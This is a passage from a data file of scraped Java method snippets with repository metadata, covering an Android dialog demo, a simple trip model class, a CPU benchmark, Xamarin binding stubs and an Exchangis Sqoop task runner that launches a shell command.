\u5185\u5bb9\u53ef\u4ee5\u4e0d\u7528\u586b\u5199                        .setContent(\"\u6211\u662f\u5185\u5bb9\")                        // \u63d0\u793a\u53ef\u4ee5\u4e0d\u7528\u586b\u5199                        .setHint(\"\u6211\u662f\u63d0\u793a\")                        // \u786e\u5b9a\u6309\u94ae\u6587\u672c                        .setConfirm(getString(R.string.common_confirm))                        // \u8bbe\u7f6e null \u8868\u793a\u4e0d\u663e\u793a\u53d6\u6d88\u6309\u94ae                        .setCancel(getString(R.string.common_cancel))                        // \u8bbe\u7f6e\u70b9\u51fb\u6309\u94ae\u540e\u4e0d\u5173\u95ed\u5bf9\u8bdd\u6846                        //.setAutoDismiss(false)                        .setListener(new InputDialog.OnListener() {                            @Override                            public void onConfirm(BaseDialog dialog, String content) {                                toast(\"\u786e\u5b9a\u4e86\uff1a\" + content);                            }                            @Override                            public void onCancel(BaseDialog dialog) {                                toast(\"\u53d6\u6d88\u4e86\");                            }                        })                        .show();                break;            case R.id.btn_dialog_bottom_menu:                List<String> data = new ArrayList<>();                for (int i = 0; i < 10; i++) {                    data.add(\"\u6211\u662f\u6570\u636e\" + i);                }                // \u5e95\u90e8\u9009\u62e9\u6846                new MenuDialog.Builder(this)                        // \u8bbe\u7f6e null \u8868\u793a\u4e0d\u663e\u793a\u53d6\u6d88\u6309\u94ae                        //.setCancel(getString(R.string.common_cancel))                        // \u8bbe\u7f6e\u70b9\u51fb\u6309\u94ae\u540e\u4e0d\u5173\u95ed\u5bf9\u8bdd\u6846                        //.setAutoDismiss(false)                        .setList(data)                        .setListener(new MenuDialog.OnListener<String>() {                            @Override                            public void onSelected(BaseDialog dialog, int position, String string) {                                toast(\"\u4f4d\u7f6e\uff1a\" + position + \"\uff0c\u6587\u672c\uff1a\" + string);                            }                            @Override                            public void onCancel(BaseDialog dialog) {                                toast(\"\u53d6\u6d88\u4e86\");                            }                        })                        .show();                break;            case R.id.btn_dialog_center_menu:                List<String> data1 = new ArrayList<>();                for (int i = 0; i < 10; i++) {                    data1.add(\"\u6211\u662f\u6570\u636e\" + i);                }                // \u5c45\u4e2d\u9009\u62e9\u6846                new MenuDialog.Builder(this)                        .setGravity(Gravity.CENTER)                        // \u8bbe\u7f6e null \u8868\u793a\u4e0d\u663e\u793a\u53d6\u6d88\u6309\u94ae                        //.setCancel(null)                        // \u8bbe\u7f6e\u70b9\u51fb\u6309\u94ae\u540e\u4e0d\u5173\u95ed\u5bf9\u8bdd\u6846                        //.setAutoDismiss(false)                        .setList(data1)                        .setListener(new MenuDialog.OnListener<String>() {                            @Override                            public void onSelected(BaseDialog dialog, int position, String string) {                                toast(\"\u4f4d\u7f6e\uff1a\" + position + \"\uff0c\u6587\u672c\uff1a\" + string);                            }                            @Override                            public void onCancel(BaseDialog dialog) {                                toast(\"\u53d6\u6d88\u4e86\");                            }                        })                        .show();                break;            case R.id.btn_dialog_single_select:                // \u5355\u9009\u5bf9\u8bdd\u6846                new SelectDialog.Builder(this)                        .setTitle(\"\u8bf7\u9009\u62e9\u4f60\u7684\u6027\u522b\")                        .setList(\"\u7537\", \"\u5973\")                        // \u8bbe\u7f6e\u5355\u9009\u6a21\u5f0f                        .setSingleSelect()                        // \u8bbe\u7f6e\u9ed8\u8ba4\u9009\u4e2d                        .setSelect(0)                        .setListener(new SelectDialog.OnListener<String>() {                            @Override                            public void onSelected(BaseDialog dialog, HashMap<Integer, String> data) {                                toast(\"\u786e\u5b9a\u4e86\" + data.toString());                            }                            @Override                            public void onCancel(BaseDialog dialog) {                                toast(\"\u53d6\u6d88\u4e86\");                            }                        })                        .show();                break;            case R.id.btn_dialog_more_select:                // \u591a\u9009\u5bf9\u8bdd\u6846                new SelectDialog.Builder(this)                        .setTitle(\"\u8bf7\u9009\u62e9\u5de5\u4f5c\u65e5\")                        .setList(\"\u661f\u671f\u4e00\", \"\u661f\u671f\u4e8c\", \"\u661f\u671f\u4e09\", \"\u661f\u671f\u56db\", \"\u661f\u671f\u4e94\")                        // \u8bbe\u7f6e\u6700\u5927\u9009\u62e9\u6570                        .setMaxSelect(3)                        // \u8bbe\u7f6e\u9ed8\u8ba4\u9009\u4e2d                        .setSelect(2, 3, 4)                        .setListener(new SelectDialog.OnListener<String>() {                            @Override                            public void onSelected(BaseDialog dialog, HashMap<Integer, String> data) {                                toast(\"\u786e\u5b9a\u4e86\" + data.toString());                            }                            @Override                            public void onCancel(BaseDialog dialog) {                                toast(\"\u53d6\u6d88\u4e86\");                            }                        })                        .show();                break;            case R.id.btn_dialog_succeed_toast:                // \u6210\u529f\u5bf9\u8bdd\u6846                new ToastDialog.Builder(this)                        .setType(ToastDialog.Type.FINISH)                        .setMessage(\"\u5b8c\u6210\")                        .show();                break;            case R.id.btn_dialog_fail_toast:                // \u5931\u8d25\u5bf9\u8bdd\u6846                new ToastDialog.Builder(this)                        .setType(ToastDialog.Type.ERROR)                        .setMessage(\"\u9519\u8bef\")                        .show();                break;            case R.id.btn_dialog_warn_toast:                // \u8b66\u544a\u5bf9\u8bdd\u6846                new ToastDialog.Builder(this)                        .setType(ToastDialog.Type.WARN)                        .setMessage(\"\u8b66\u544a\")                        .show();                break;            case R.id.btn_dialog_wait:                // \u7b49\u5f85\u5bf9\u8bdd\u6846                final BaseDialog waitDialog = new WaitDialog.Builder(this)                        // \u6d88\u606f\u6587\u672c\u53ef\u4ee5\u4e0d\u7528\u586b\u5199                        .setMessage(getString(R.string.common_loading))                        .show();                postDelayed(waitDialog::dismiss, 2000);                break;            case R.id.btn_dialog_pay:                // \u652f\u4ed8\u5bc6\u7801\u8f93\u5165\u5bf9\u8bdd\u6846                new PayPasswordDialog.Builder(this)                        .setTitle(getString(R.string.pay_title))                        .setSubTitle(\"\u7528\u4e8e\u8d2d\u4e70\u4e00\u4e2a\u5973\u76c6\u53cb\")                        .setMoney(\"\uffe5 100.00\")                        //.setAutoDismiss(false) // \u8bbe\u7f6e\u70b9\u51fb\u6309\u94ae\u540e\u4e0d\u5173\u95ed\u5bf9\u8bdd\u6846                        .setListener(new PayPasswordDialog.OnListener() {                            @Override                            public void onCompleted(BaseDialog dialog, String password) {                                toast(password);                            }                            @Override                            public void onCancel(BaseDialog dialog) {                                toast(\"\u53d6\u6d88\u4e86\");                            }                        })                        .show();                break;            case R.id.btn_dialog_address:                // \u9009\u62e9\u5730\u533a\u5bf9\u8bdd\u6846                new AddressDialog.Builder(this)                        .setTitle(getString(R.string.address_title))                        // \u8bbe\u7f6e\u9ed8\u8ba4\u7701\u4efd                        //.setProvince(\"\u5e7f\u4e1c\u7701\")                        // \u8bbe\u7f6e\u9ed8\u8ba4\u57ce\u5e02\uff08\u5fc5\u987b\u8981\u5148\u8bbe\u7f6e\u9ed8\u8ba4\u7701\u4efd\uff09                        //.setCity(\"\u5e7f\u5dde\u5e02\")                        // \u4e0d\u9009\u62e9\u53bf\u7ea7\u533a\u57df                        //.setIgnoreArea()                        .setListener(new AddressDialog.OnListener() {                            @Override                            public void onSelected(BaseDialog dialog, String province, String city, String area) {                                toast(province + city + area);                            }                            @Override                            public void onCancel(BaseDialog dialog) {                                toast(\"\u53d6\u6d88\u4e86\");                            }                        })                        .show();                break;            case R.id.btn_dialog_date:                // \u65e5\u671f\u9009\u62e9\u5bf9\u8bdd\u6846                new DateDialog.Builder(this)                        .setTitle(getString(R.string.date_title))                        // \u786e\u5b9a\u6309\u94ae\u6587\u672c                        .setConfirm(getString(R.string.common_confirm))                        // \u8bbe\u7f6e null \u8868\u793a\u4e0d\u663e\u793a\u53d6\u6d88\u6309\u94ae                        .setCancel(getString(R.string.common_cancel))                        // \u8bbe\u7f6e\u65e5\u671f                        //.setDate(\"2018-12-31\")                        //.setDate(\"20181231\")                        //.setDate(1546263036137)                        // \u8bbe\u7f6e\u5e74\u4efd                        //.setYear(2018)                        // \u8bbe\u7f6e\u6708\u4efd                        //.setMonth(2)                        // \u8bbe\u7f6e\u5929\u6570                        //.setDay(20)                        // \u4e0d\u9009\u62e9\u5929\u6570                        //.setIgnoreDay()                        .setListener(new DateDialog.OnListener() {                            @Override                            public void onSelected(BaseDialog dialog, int year, int month, int day) {                                toast(year + getString(R.string.common_year) + month + getString(R.string.common_month) + day + getString(R.string.common_day));                                // \u5982\u679c\u4e0d\u6307\u5b9a\u65f6\u5206\u79d2\u5219\u9ed8\u8ba4\u4e3a\u73b0\u5728\u7684\u65f6\u95f4                                Calendar calendar = Calendar.getInstance();                                calendar.set(Calendar.YEAR, year);                                // \u6708\u4efd\u4ece\u96f6\u5f00\u59cb\uff0c\u6240\u4ee5\u9700\u8981\u51cf 1                                calendar.set(Calendar.MONTH, month - 1);                                calendar.set(Calendar.DAY_OF_MONTH, day);                                toast(\"\u65f6\u95f4\u6233\uff1a\" + calendar.getTimeInMillis());                                //toast(new SimpleDateFormat(\"yyyy\u5e74MM\u6708dd\u65e5 kk:mm:ss\").format(calendar.getTime()));                            }                            @Override                            public void onCancel(BaseDialog dialog) {                                toast(\"\u53d6\u6d88\u4e86\");                            }                        })                        .show();                break;            case R.id.btn_dialog_time:                // \u65f6\u95f4\u9009\u62e9\u5bf9\u8bdd\u6846                new TimeDialog.Builder(this)                        .setTitle(getString(R.string.time_title))                        // \u786e\u5b9a\u6309\u94ae\u6587\u672c                        .setConfirm(getString(R.string.common_confirm))                        // \u8bbe\u7f6e null \u8868\u793a\u4e0d\u663e\u793a\u53d6\u6d88\u6309\u94ae                        .setCancel(getString(R.string.common_cancel))                        // \u8bbe\u7f6e\u65f6\u95f4                        //.setTime(\"23:59:59\")                        //.setTime(\"235959\")                        // \u8bbe\u7f6e\u5c0f\u65f6                        //.setHour(23)                        // \u8bbe\u7f6e\u5206\u949f                        //.setMinute(59)                        // \u8bbe\u7f6e\u79d2\u6570                        //.setSecond(59)                        // \u4e0d\u9009\u62e9\u79d2\u6570                        //.setIgnoreSecond()                        .setListener(new TimeDialog.OnListener() {                            @Override                            public void onSelected(BaseDialog dialog, int hour, int minute, int second) {                                toast(hour + getString(R.string.common_hour) + minute + getString(R.string.common_minute) + second + getString(R.string.common_second));                                // \u5982\u679c\u4e0d\u6307\u5b9a\u5e74\u6708\u65e5\u5219\u9ed8\u8ba4\u4e3a\u4eca\u5929\u7684\u65e5\u671f                                Calendar calendar = Calendar.getInstance();                                calendar.set(Calendar.HOUR_OF_DAY, hour);                                calendar.set(Calendar.MINUTE, minute);                                calendar.set(Calendar.SECOND, second);                                toast(\"\u65f6\u95f4\u6233\uff1a\" + calendar.getTimeInMillis());                                //toast(new SimpleDateFormat(\"yyyy\u5e74MM\u6708dd\u65e5 kk:mm:ss\").format(calendar.getTime()));                            }                            @Override                            public void onCancel(BaseDialog dialog) {                                toast(\"\u53d6\u6d88\u4e86\");                            }                        })                        .show();                break;            case R.id.btn_dialog_share:                toast(\"\u8bb0\u5f97\u6539\u597d\u7b2c\u4e09\u65b9 AppID \u548c AppKey\uff0c\u5426\u5219\u4f1a\u8c03\u4e0d\u8d77\u6765\u54e6\");                toast(\"\u4e5f\u522b\u5fd8\u4e86\u6539\u5fae\u4fe1 \" + WXEntryActivity.class.getSimpleName() + \" \u7c7b\u6240\u5728\u7684\u5305\u540d\u54e6\");                // \u5206\u4eab\u5bf9\u8bdd\u6846                new ShareDialog.Builder(this)                        // \u5206\u4eab\u6807\u9898                        .setShareTitle(\"Github\")                        // \u5206\u4eab\u63cf\u8ff0                        .setShareDescription(\"AndroidProject\")                        // \u5206\u4eab\u7f29\u7565\u56fe                        .setShareLogo(\"https://avatars1.githubusercontent.com/u/28616817?s=460&v=4\")                        // \u5206\u4eab\u94fe\u63a5                        .setShareUrl(\"https://github.com/getActivity/AndroidProject\")                        .setListener(new UmengShare.OnShareListener() {                            @Override                            public void onSucceed(Platform platform) {                                toast(\"\u5206\u4eab\u6210\u529f\");                            }                            @Override                            public void onError(Platform platform, Throwable t) {                                toast(\"\u5206\u4eab\u51fa\u9519\");                            }                            @Override                            public void onCancel(Platform platform) {                                toast(\"\u5206\u4eab\u53d6\u6d88\");                            }                        })                        .show();                break;            case R.id.btn_dialog_update:                // \u5347\u7ea7\u5bf9\u8bdd\u6846                new UpdateDialog.Builder(this)                        // \u7248\u672c\u540d                        .setVersionName(\"2.0\")                        // \u662f\u5426\u5f3a\u5236\u66f4\u65b0                        .setForceUpdate(false)                        // \u66f4\u65b0\u65e5\u5fd7                        .setUpdateLog(\"\u5230\u5e95\u66f4\u65b0\u4e86\u5565\\n\u5230\u5e95\u66f4\u65b0\u4e86\u5565\\n\u5230\u5e95\u66f4\u65b0\u4e86\u5565\\n\u5230\u5e95\u66f4\u65b0\u4e86\u5565\\n\u5230\u5e95\u66f4\u65b0\u4e86\u5565\")                        // \u4e0b\u8f7d URL                        .setDownloadUrl(\"https://raw.githubusercontent.com/getActivity/AndroidProject/master/AndroidProject.apk\")                        // \u6587\u4ef6 MD5                        //.setFileMD5(\"56A5A5712D1856BDBD4C2AECA9B1FFE7\")                        .show();                break;            case R.id.btn_dialog_custom:                // \u81ea\u5b9a\u4e49\u5bf9\u8bdd\u6846                new BaseDialog.Builder(this)                        .setContentView(R.layout.dialog_custom)                        //.setText(id, \"\u6211\u662f\u9884\u8bbe\u7f6e\u7684\u6587\u672c\")                        .setOnClickListener(R.id.btn_dialog_custom_ok, (BaseDialog.OnClickListener<ImageView>) (dialog, view) -> dialog.dismiss())                        .addOnShowListener(dialog -> toast(\"Dialog  \u663e\u793a\u4e86\"))                        .addOnCancelListener(dialog -> toast(\"Dialog \u53d6\u6d88\u4e86\"))                        .addOnDismissListener(dialog -> toast(\"Dialog \u9500\u6bc1\u4e86\"))                        .setOnKeyListener((dialog, event) -> {                            toast(\"\u6309\u952e\u4ee3\u7801\uff1a\" + event.getKeyCode());                            return false;                        })                        .show();                break;            default:                break;        }    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/DialogActivity.java", "stars": "1", "class": {"name": "DialogActivity", "extends": "MyActivity", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "onActivityResult", "params": ["int", "int", "Intent"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {        super.onActivityResult(requestCode, resultCode, data);        // \u53cb\u76df\u5206\u4eab\u56de\u8c03        UmengClient.onActivityResult(this, requestCode, resultCode, data);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/DialogActivity.java", "stars": "1", "class": {"name": "DialogActivity", "extends": "MyActivity", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "onRightClick", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRightClick(View v) {        // \u83dc\u5355\u5f39\u7a97        new MenuPopup.Builder(this)                .setList(\"\u9009\u62e9\u62cd\u7167\", \"\u9009\u53d6\u76f8\u518c\")                .setListener((MenuPopup.OnListener<String>) (popupWindow, position, s) -> toast(s))                .showAsDropDown(v);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/DialogActivity.java", "stars": "1", "class": {"name": "DialogActivity", "extends": "MyActivity", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "getOrigen", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOrigen() {        return origen;    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/Viaje.java", "stars": "1", "class": {"name": "Viaje", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getDestino", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDestino() {        return destino;    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/Viaje.java", "stars": "1", "class": {"name": "Viaje", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getCosto", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCosto() {        return costo;    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/Viaje.java", "stars": "1", "class": {"name": "Viaje", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getFechaSalida", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getFechaSalida() {        return fechaSalida;    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/Viaje.java", "stars": "1", "class": {"name": "Viaje", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getFechaLlegada", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getFechaLlegada() {        return fechaLlegada;    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/Viaje.java", "stars": "1", "class": {"name": "Viaje", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setOrigen", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOrigen(String origen) {        this.origen = origen;    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/Viaje.java", "stars": "1", "class": {"name": "Viaje", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setDestino", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDestino(String destino) {        this.destino = destino;    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/Viaje.java", "stars": "1", "class": {"name": "Viaje", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setCosto", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCosto(int costo) {        this.costo = costo;    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/Viaje.java", "stars": "1", "class": {"name": "Viaje", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setFechaSalida", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFechaSalida(Date fechaSalida) {        this.fechaSalida = fechaSalida;    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/Viaje.java", "stars": "1", "class": {"name": "Viaje", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setFechaLlegada", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFechaLlegada(Date fechaLlegada) {        this.fechaLlegada = fechaLlegada;    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/Viaje.java", "stars": "1", "class": {"name": "Viaje", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "descripcion", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "String", "snippet": "    public abstract String descripcion();        public String cualquierMetodo(){        return \"Cualquier m\u00e9todo implementado en la clase base\";    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/Viaje.java", "stars": "1", "class": {"name": "Viaje", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "cualquierMetodo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String cualquierMetodo(){        return \"Cualquier m\u00e9todo implementado en la clase base\";    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/Viaje.java", "stars": "1", "class": {"name": "Viaje", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "cualquierMetodo2", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String cualquierMetodo2(){        return \"Cualquier m\u00e9todo2 implementado en la clase base\";    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/Viaje.java", "stars": "1", "class": {"name": "Viaje", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "main", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args)throws IOException{\t\t// TODO Auto-generated method stub\t\t\tlong time;\t\t\tCPUFixedPoint bench = new CPUFixedPoint();\t\tITiming timer = new Timing();\t\tILogger fileLogger = new FileLogger(\"writefile.txt\");\t\tILogger consoleLogger = new ConsoleLogger();\t\t\tfinal int workload = 50000;\t\tfinal int size = 40;\t\t\tbench.initialize(workload,size);\t\t\ttimer.start();\t\tbench.warmUp();\t\ttime = timer.stop();\t\tTimeUnit WarmupUnit = TimeUnit.Micro;\t\tfileLogger.writeTime(\"Warmup took\", time, WarmupUnit  );\t\tconsoleLogger.writeTime(\"Warmup took\", time, WarmupUnit  );\t\t\ttimer.start();\t\tbench.run();\t\ttime = timer.stop();\t\t\tTimeUnit unit = TimeUnit.Micro;\t\tfileLogger.write(\"Took \", time, \"ns.\");\t\tfileLogger.writeTime(\"= \", time, unit  );\t\tconsoleLogger.write(\"Took \", time, \"ns.\\n\");\t\tconsoleLogger.writeTime(\"Took \", time, unit  );\t\t\t\tdouble OPS,MOPS;\t\t\t\tdouble timesec =  (time/1000000000.0);\t\tOPS = ( (47.0 + 20.0 * size  ) * workload )/time ;\t\tMOPS = OPS /  1e6 ;\t\t\t\tfileLogger.write(\"OPS \", timesec+\"\\n\");\t\tconsoleLogger.write(\"OPS \", OPS+\"\\n\");\t\tfileLogger.write(\"MOPS \", MOPS+\"\\n\");\t\tconsoleLogger.write(\"MOPS \", MOPS+\"\\n\");\t\t\t\tbench.clean();\t\tfileLogger.close();\t}", "url": "https://raw.githubusercontent.com/miricel/CO_Project/master/UPTBench/src/testbench/TestCPUFixedPoint.java", "stars": "2", "class": {"name": "TestCPUFixedPoint", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onScrollChange", "params": ["android", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onScrollChange (android.support.v4.widget.NestedScrollView p0, int p1, int p2, int p3, int p4)\t{\t\tn_onScrollChange (p0, p1, p2, p3, p4);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/mono/android/support/v4/widget/NestedScrollView_OnScrollChangeListenerImplementor.java", "stars": "2", "class": {"name": "NestedScrollView_OnScrollChangeListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onScrollChange", "params": ["android", "int", "int", "int", "int"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onScrollChange (android.support.v4.widget.NestedScrollView p0, int p1, int p2, int p3, int p4);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/mono/android/support/v4/widget/NestedScrollView_OnScrollChangeListenerImplementor.java", "stars": "2", "class": {"name": "NestedScrollView_OnScrollChangeListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/mono/android/support/v4/widget/NestedScrollView_OnScrollChangeListenerImplementor.java", "stars": "2", "class": {"name": "NestedScrollView_OnScrollChangeListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/mono/android/support/v4/widget/NestedScrollView_OnScrollChangeListenerImplementor.java", "stars": "2", "class": {"name": "NestedScrollView_OnScrollChangeListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "initInternal", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initInternal() {        //do nothing    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/sqoop/SqoopTaskProcess.java", "stars": "23", "class": {"name": "SqoopTaskProcess", "extends": "AbstractJavaInternalTaskProcess", "implements": ["LoggerDaemon"], "modifiers": ["public"]}}, {"method_name": "executeInternal", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Process", "snippet": "    protected Process executeInternal() {        String execUser = getExecUser();        String maxMemory = getTaskConfig().getString(SETTINGS_MAX_MEMORY, \"1g\");        //unit conversion        long headSizeM = MemUtils.convertToMB(Integer.parseInt(maxMemory.substring(0, maxMemory.length()-1)),                maxMemory.substring(maxMemory.length() - 1));        TaskConfiguration taskConfig = getTaskConfig();        String sqoopCmd = getExecConfig().getEngineSqoopShell() + \" \" + taskConfig.getString(SqoopTaskConfigBuilder.CONFIG_COMMAND);        String command = StringUtils.join(new String[]{                \"echo $$ > \" + pidFileName(), \"&&\",                \"echo \" + mask(sqoopCmd) + \"\", \"&&\",                sqoopCmd , \"2>&1\", \"&&\",                \"rm \" + pidFileName()        }, \" \");        if(needToSwitchUser(execUser)){            command = \"sudo su \" + execUser + \" -c \\\"\" + command +\"\\\"\";        }        LOG.info(\"Run command:{}\", command);        Map<String, String> env = new HashMap<>(1);        //hadoop config        env.put(\"HADOOP_CLIENT_OPTS\", \"-Xmx\" + headSizeM + \"m\");        env.put(\"HADOOP_HEAPSIZE\", String.valueOf(headSizeM));        try{            ProcessBuilder builder = RunShell.createProcBuilder(command ,env, this.workDir);            return builder.start();        }catch(Exception e){            LOG.error(\"Execute Sqoop occurred error: \" + e.getMessage(), e);            throw new RuntimeException(e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/sqoop/SqoopTaskProcess.java", "stars": "23", "class": {"name": "SqoopTaskProcess", "extends": "AbstractJavaInternalTaskProcess", "implements": ["LoggerDaemon"], "modifiers": ["public"]}}, {"method_name": "getResource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Resource", "snippet": "    public Resource getResource() {        String maxMemory = getTaskConfig().getString(SETTINGS_MAX_MEMORY, \"1g\");        return new Resource(getTaskId(), 0,                MemUtils.convertToByte(Long.parseLong(maxMemory.substring(0, maxMemory.length() - 1)),                        maxMemory.substring(maxMemory.length() - 1)));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/sqoop/SqoopTaskProcess.java", "stars": "23", "class": {"name": "SqoopTaskProcess", "extends": "AbstractJavaInternalTaskProcess", "implements": ["LoggerDaemon"], "modifiers": ["public"]}}, {"method_name": "logFileName", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "    protected String logFileName() {        return JobContainer.LOG_STDOUT_NAME;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/sqoop/SqoopTaskProcess.java", "stars": "23", "class": {"name": "SqoopTaskProcess", "extends": "AbstractJavaInternalTaskProcess", "implements": ["LoggerDaemon"], "modifiers": ["public"]}}, {"method_name": "acceptLogger", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean acceptLogger(String loggerName){        return loggerName.equals(JobContainer.LOG_STDOUT_NAME);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/sqoop/SqoopTaskProcess.java", "stars": "23", "class": {"name": "SqoopTaskProcess", "extends": "AbstractJavaInternalTaskProcess", "implements": ["LoggerDaemon"], "modifiers": ["public"]}}, {"method_name": "parseLoggerOutput", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void parseLoggerOutput(String output) {        if(StringUtils.isBlank(clusterJobId) && output.contains(JOB_SUBMIT_PREFIX)){            Matcher matcher = JOB_ID_PATTERN.matcher(output);            if(matcher.find()){                this.clusterJobId = matcher.group(1);            }        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/task/process/sqoop/SqoopTaskProcess.java", "stars": "23", "class": {"name": "SqoopTaskProcess", "extends": "AbstractJavaInternalTaskProcess", "implements": ["LoggerDaemon"], "modifiers": ["public"]}}, {"method_name": "killProcess", "params": ["int"], "throws": ["IOException", 